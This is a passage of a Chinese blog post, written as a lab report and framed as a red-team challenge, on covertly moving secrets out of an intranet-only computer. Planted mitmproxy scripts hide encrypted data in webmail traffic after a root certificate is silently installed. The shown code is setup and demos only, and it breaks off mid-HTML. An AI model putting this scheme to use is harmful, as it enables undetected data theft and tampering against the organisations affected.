<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>借助mitmproxy通过电子邮件隐式传输信息 | Tisfy的LeetCode题解等博客</title><link rel="canonical" href="https://blog.letmefly.xyz/_posts/Other-Network-HowToSendHiddenMsgThroughEmailWithMitmproxy.html"><link rel="icon" type="image/x-icon" href="https://web.letmefly.xyz/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/theme/arknights/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/theme/arknights/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/theme/arknights/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/theme/arknights/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/theme/arknights/font/Bender.ttf"), url("/theme/arknights/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/theme/arknights/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/theme/arknights/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/theme/arknights/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/theme/arknights/lib/encrypt/hbe.style.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/theme/arknights/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/theme/arknights/img/bk.jpg');
 --theme-encrypt-confirm: '确认'
}</style><script defer src="/theme/arknights/js/arknights.js"></script><script defer type="module">window.MathJax = { tex: { inlineMath: [['$', '$'], ['\\(', '\\)']], }, chtml: { scale: 0.8 }};
</script><script defer src="https://letmefly.xyz/Links/JS/MathJax/tex-mml-chtml.js"></script><script defer src="/theme/arknights/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script defer src="https://letmefly.xyz/Links/Common.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/theme/arknights/lib/encrypt/hbe.js"></script><script async src="/theme/arknights/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/theme/arknights/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/theme/arknights/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>借助mitmproxy通过电子邮件隐式传输信息</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2025-03-23T12:29:17.000Z" id="date"> 2025-03-23</time></div></span></div></div><hr><div id="post-content"><h1 id="借助mitmproxy通过电子邮件隐式传输信息"><a href="#借助mitmproxy通过电子邮件隐式传输信息" class="headerlink" title="借助mitmproxy通过电子邮件隐式传输信息"></a>借助mitmproxy通过电子邮件隐式传输信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这其实是我上上周的组会周报。</p>
<p><strong>要实现的效果：</strong></p>
<p>假设邮件发送方的电脑不能连接外网只能通过自建OWA等服务向内网邮箱发送邮件，但接收方除了可以通过内网访问邮件服务接收邮件外还能连接外网。在邮件收发双方各自植入一个mitmproxy脚本，发送方脚本在发送方电脑上扫描到秘密信息想要传递出来，接收方脚本获取到秘密信息后将信息解密并悄悄传输到外网。</p>
<p>整个过程需要保证：收发双方在浏览器中无法察觉邮件被篡改了。</p>
<p><strong>应用场景(讲故事)：</strong></p>
<p>AB两公司都是以安全为主业的公司，B公司为了测试A公司的安全保密程度是否可靠，向A公司发起了挑战，以成功将A公司的核心电脑上的一些信息传输出来为目标。</p>
<p>A公司接受了这一挑战，为了防止A公司核心电脑上的内容遭到泄露，A公司将核心电脑修改为只能连接内网，A公司认为，由于B公司无法访问A公司内网，所以这样就会尽可能地安全。</p>
<p>但是A公司的核心电脑在某些时候仍然需要被使用，因为疫情等原因A公司有员工使用非核心电脑在家远程办公。A公司的主管有时需要使用核心电脑通过内网和非核心成员进行沟通。</p>
<p>B公司决定利用这一特性，想要通过A公司将邮件通过内网发送给能连接外网的非核心电脑这一特性来将核心电脑的信息传输出来。</p>
<p>假设B公司已经利用已有漏洞在A公司的电脑上植入了一些脚本，这些脚本可以进行如下操作：</p>
<ol>
<li>对于A公司不能联网的核心电脑，脚本读取核心电脑上的一些信息。并在核心电脑上静默安装可信任证书，使用mitmproxy工具，在核心电脑使用邮件客户端（实际上走的HTTPS协议）发送消息时，将想要传输的消息编码加密并以一定的格式附加到邮件的末尾。</li>
<li>对于A公司能联网的非核心电脑，脚本同样通过mitmproxy，在非核心成员通过网页读取邮件时，读取邮件中附加的内容并解码，将邮件内容还原。之后由于非核心电脑能够连接公网，脚本可以直接往B公司预留接口发送加密后的信息，至此A公司只能连接内网的核心电脑上的一部分信息也被隐式地传输了出来。</li>
</ol>
<p>这样，核心电脑和非核心电脑所能看到的都是正常的邮件，A公司很难察觉。因此，B公司胜利，成功证明了以安全为主业的A公司仍然存在安全保障不周的漏洞。</p>
<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="改包"><a href="#改包" class="headerlink" title="改包"></a>改包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install mitmproxy</span><br><span class="line">mitmproxy --mode transparent  <span class="comment"># 禁止python透过防火墙的话，可能需要管理员权限下运行</span></span><br><span class="line"><span class="comment"># 也可以指定只捕获本机数据包：mitmproxy -s main.py --listen-host localhost，这样的话在我笔记本上实测不需要管理员权限</span></span><br></pre></td></tr></table></figure>

<p>浏览器访问<code>http://mitm.it</code>下载证书并安装：</p>
<ul>
<li>双击P12文件，启动导入向导。</li>
<li>选择证书存储位置(这将决定谁将信任该证书——仅当前Windows用户OR机器上的所有人)点击下一步。</li>
<li>再次点击下一步。</li>
<li>将密码留空并点击下一步。</li>
<li>选择“将所有证书放入以下存储”，然后点击浏览，并选择“受信任的根证书颁发机构”。</li>
<li>点击确定和下一步。</li>
<li>点击完成。</li>
<li>在警告对话框中点击是以确认。</li>
</ul>
<p>这一步中，若是向“当前用户”安装证书，则不需要管理员权限。</p>
<p>当然也可以使用命令行添加证书（未实操）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -addstore root 0.crt</span><br></pre></td></tr></table></figure>

<p>若想编写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logger_url = logging.getLogger(<span class="string">&#x27;logger_url&#x27;</span>)</span><br><span class="line">formatter_url = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logger_url.handlers[:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(handler, logging.StreamHandler):</span><br><span class="line">        logger_url.removeHandler(handler)</span><br><span class="line">logger_url.setLevel(logging.DEBUG)</span><br><span class="line">filehandler_url = logging.FileHandler(<span class="string">&#x27;url.log&#x27;</span>)</span><br><span class="line">filehandler_url.setFormatter(formatter_url)</span><br><span class="line">logger_url.addHandler(filehandler_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger_text = logging.getLogger(<span class="string">&#x27;logger_text&#x27;</span>)</span><br><span class="line">formatter_text = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logger_text.handlers[:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(handler, logging.StreamHandler):</span><br><span class="line">        logger_text.removeHandler(handler)</span><br><span class="line">logger_text.setLevel(logging.DEBUG)</span><br><span class="line">filehandler_text = logging.FileHandler(<span class="string">&#x27;text.log&#x27;</span>)</span><br><span class="line">filehandler_text.setFormatter(formatter_text)</span><br><span class="line">logger_text.addHandler(filehandler_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># # 修改请求</span></span><br><span class="line">    <span class="comment"># if &quot;letmefly.xyz&quot; in flow.request.pretty_url:</span></span><br><span class="line">    <span class="comment">#     flow.request.headers[&quot;User-Agent&quot;] = &quot;Modified-Agent&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># 修改响应</span></span><br><span class="line">    logger_url.info(flow.request.pretty_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;web.letmefly.xyz&quot;</span> <span class="keyword">in</span> flow.request.pretty_url <span class="keyword">and</span> <span class="string">&#x27;text/html&#x27;</span> <span class="keyword">in</span> flow.response.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">    <span class="comment"># if flow.request.pretty_url == &#x27;https://web.letmefly.xyz/&#x27;:</span></span><br><span class="line">        logger_url.info(<span class="string">&#x27;replace HTML to LMTH&#x27;</span>)</span><br><span class="line">        <span class="comment"># logger_text.info(flow.response.text)</span></span><br><span class="line">        flow.response.text = flow.response.text.replace(<span class="string">&quot;HTML&quot;</span>, <span class="string">&quot;LMTH&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>设置代理服务器为<code>localhost:8080</code>，然后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -s modifyPackage.py --listen-host localhost</span><br></pre></td></tr></table></figure>

<p>结果发现：请求替换成功！</p>
<p>代理前：</p>
<p class='item-img' data-src='https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/da1213d9daee496d985dceb63d8d03b9.jpeg'><img src="https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/da1213d9daee496d985dceb63d8d03b9.jpeg" alt="代理前"></p>
<!-- ![代理前](../../binaryFiles/pics/20250308/beforeChange.jpg) -->

<p>代理后：</p>
<p class='item-img' data-src='https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/f12b9331cfd9410f97c11dcb5af45f36.jpeg'><img src="https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/f12b9331cfd9410f97c11dcb5af45f36.jpeg" alt="代理后"></p>
<!-- ![代理后](../../binaryFiles/pics/20250308/afterchange.jpg) -->

<p>由于具有主机操作权限，所以主机信任mitm颁发的证书，浏览器也没有任何“不安全警告”，页面就这么悄无声息地被替换了。</p>
<h3 id="邮件发送"><a href="#邮件发送" class="headerlink" title="邮件发送"></a>邮件发送</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> password <span class="keyword">import</span> sender_password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件配置</span></span><br><span class="line">smtp_server = <span class="string">&#x27;smtp.qq.com&#x27;</span></span><br><span class="line">smtp_port = <span class="number">587</span></span><br><span class="line">sender_email = <span class="string">&#x27;LetMeFly666@qq.com&#x27;</span></span><br><span class="line">sender_password = sender_password</span><br><span class="line">receiver_email = <span class="string">&#x27;Tisfy@qq.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建邮件内容</span></span><br><span class="line">subject = <span class="string">&#x27;这是一封正常邮件&#x27;</span></span><br><span class="line">body = <span class="string">&#x27;今天中午吃饭吗&#x27;</span></span><br><span class="line">msg = MIMEMultipart()</span><br><span class="line">msg[<span class="string">&#x27;From&#x27;</span>] = sender_email</span><br><span class="line">msg[<span class="string">&#x27;To&#x27;</span>] = receiver_email</span><br><span class="line">msg[<span class="string">&#x27;Subject&#x27;</span>] = subject</span><br><span class="line">msg.attach(MIMEText(body, <span class="string">&#x27;plain&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送邮件</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    server = smtplib.SMTP(smtp_server, smtp_port)</span><br><span class="line">    server.starttls()</span><br><span class="line">    server.login(sender_email, sender_password)</span><br><span class="line">    server.sendmail(sender_email, receiver_email, msg.as_string())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;邮件发送成功&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;邮件发送失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.quit()</span><br></pre></td></tr></table></figure>

<p class='item-img' data-src='https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/c9bc55cbd8ca40eda5e544b11d32b262.jpeg'><img src="https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/c9bc55cbd8ca40eda5e544b11d32b262.jpeg" alt="发送成功"></p>
<!-- ![发送成功](../../binaryFiles/pics/20250308/sendok.jpg) -->

<h3 id="邮件接收"><a href="#邮件接收" class="headerlink" title="邮件接收"></a>邮件接收</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> password <span class="keyword">import</span> sender_password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件配置</span></span><br><span class="line">imap_server = <span class="string">&#x27;imap.qq.com&#x27;</span></span><br><span class="line">imap_port = <span class="number">993</span></span><br><span class="line">email_address = <span class="string">&#x27;tf.li@foxmail.com&#x27;</span></span><br><span class="line">email_password = sender_password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到IMAP服务器</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    mail = imaplib.IMAP4_SSL(imap_server, imap_port)</span><br><span class="line">    mail.login(email_address, email_password)</span><br><span class="line">    mail.select(<span class="string">&#x27;inbox&#x27;</span>)  <span class="comment"># 选择收件箱</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索邮件</span></span><br><span class="line">    status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;ALL&#x27;</span>)  <span class="comment"># 获取所有邮件</span></span><br><span class="line">    <span class="keyword">if</span> status != <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有找到邮件&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取邮件列表</span></span><br><span class="line">    mail_ids = messages[<span class="number">0</span>].split()</span><br><span class="line">    latest_mail_id = mail_ids[-<span class="number">1</span>]  <span class="comment"># 获取最新的一封邮件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取邮件内容</span></span><br><span class="line">    status, msg_data = mail.fetch(latest_mail_id, <span class="string">&#x27;(RFC822)&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> status != <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法获取邮件内容&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析邮件内容</span></span><br><span class="line">    <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">            msg = email.message_from_bytes(response_part[<span class="number">1</span>])</span><br><span class="line">            subject, encoding = decode_header(msg[<span class="string">&#x27;Subject&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            from_ = msg.get(<span class="string">&#x27;From&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;主题: <span class="subst">&#123;subject&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发件人: <span class="subst">&#123;from_&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获取邮件正文</span></span><br><span class="line">            <span class="keyword">if</span> msg.is_multipart():</span><br><span class="line">                <span class="keyword">for</span> part <span class="keyword">in</span> msg.walk():</span><br><span class="line">                    content_type = part.get_content_type()</span><br><span class="line">                    content_disposition = <span class="built_in">str</span>(part.get(<span class="string">&quot;Content-Disposition&quot;</span>))</span><br><span class="line">                    <span class="keyword">if</span> content_type == <span class="string">&#x27;text/plain&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;attachment&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> content_disposition:</span><br><span class="line">                        body = part.get_payload(decode=<span class="literal">True</span>).decode()</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;正文: <span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                body = msg.get_payload(decode=<span class="literal">True</span>).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;正文: <span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;接收邮件失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    mail.logout()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>在邮件接收还未认证的时候，忽然想到mitmproxy是不是只能抓HTTP(s)不能抓SMTP之类的</p>
<p>发了个邮件果然没抓到。。。</p>
</blockquote>
<h3 id="客户端发送邮件抓包"><a href="#客户端发送邮件抓包" class="headerlink" title="客户端发送邮件抓包"></a>客户端发送邮件抓包</h3><p>那就不模拟了，直接使用客户端发吧，这样也更真实一点。</p>
<p>以QQ邮件为例，发送邮件时会向<code>https://mail.qq.com/cgi-bin/compose_send?sid=xxxxx</code>发送一个POST请求，表单数据包括：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">mailtype: </span><br><span class="line">dockey: </span><br><span class="line">bigattachcontent: </span><br><span class="line">xxxxxxxxxxx: xxxxxxxxx</span><br><span class="line">sid: xxxxx</span><br><span class="line">bigattachcnt: </span><br><span class="line">exstore: </span><br><span class="line">from_s: cnew</span><br><span class="line">swap: </span><br><span class="line">signtype: </span><br><span class="line">newwin: </span><br><span class="line">verifykey: </span><br><span class="line">stationeryCount: </span><br><span class="line">to: &quot;Let&quot;&lt;Tisfy@qq.com&gt;</span><br><span class="line">swap3: </span><br><span class="line">cc: </span><br><span class="line">subject: 今日指令</span><br><span class="line">content__html: 一切正常，和昨天一样</span><br><span class="line">sendmailname: tisfy@foxmail.com</span><br><span class="line">savesendbox: 1</span><br><span class="line">swap2: </span><br><span class="line">transattach: </span><br><span class="line">SrcMailCharset: </span><br><span class="line">xqqstyle: </span><br><span class="line">mailbgmusic: </span><br><span class="line">actiontype: send</span><br><span class="line">priority: </span><br><span class="line">sendname: LetMeFly</span><br><span class="line">acctid: 0 </span><br><span class="line">ReAndFw: </span><br><span class="line">separatedcopy: false</span><br><span class="line">fmailid: xxxx-xxxxxx</span><br><span class="line">ReAndFwMailid: </span><br><span class="line">cattachelist: </span><br><span class="line">upfilelist: </span><br><span class="line">rsturl: </span><br><span class="line">fileidlist: </span><br><span class="line">t: backgroundsend</span><br><span class="line">verifycode: </span><br><span class="line">verifycode_cn: </span><br><span class="line">s: comm</span><br><span class="line">from: </span><br><span class="line">hitaddrbook: 0</span><br><span class="line">selfdefinestation: -1</span><br><span class="line">backurl: </span><br><span class="line">noatcp: </span><br><span class="line">domaincheck: 0</span><br><span class="line">cgitm: 1741223758403</span><br><span class="line">clitm: 1741223762955</span><br><span class="line">comtm: 1741223962691</span><br><span class="line">logattcnt: 0</span><br><span class="line">logattsize: 0</span><br><span class="line">logattmethod: </span><br><span class="line">timezone: 28800</span><br><span class="line">timezone_dst: 0</span><br><span class="line">resp_charset: UTF8</span><br><span class="line">bgsend: 1</span><br></pre></td></tr></table></figure>

<p>消息内容在<code>content__html</code>字段中。又觉得可行了起来。</p>
<h3 id="客户端接收邮件抓包"><a href="#客户端接收邮件抓包" class="headerlink" title="客户端接收邮件抓包"></a>客户端接收邮件抓包</h3><p>当用户读取具体邮件时，会请求：<code>https://mail.qq.com/cgi-bin/readmail?folderid=1&amp;folderkey=1&amp;t=readmail&amp;mailid=xxxx~xxx&amp;mode=pre&amp;maxage=3600&amp;base=11.08&amp;ver=13964&amp;sid=xxxx</code>。</p>
<p>请求头之类的不重要，我们只要匹配这个url就行。</p>
<p>可以看到，响应体里就是一个HTML，简化后如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; 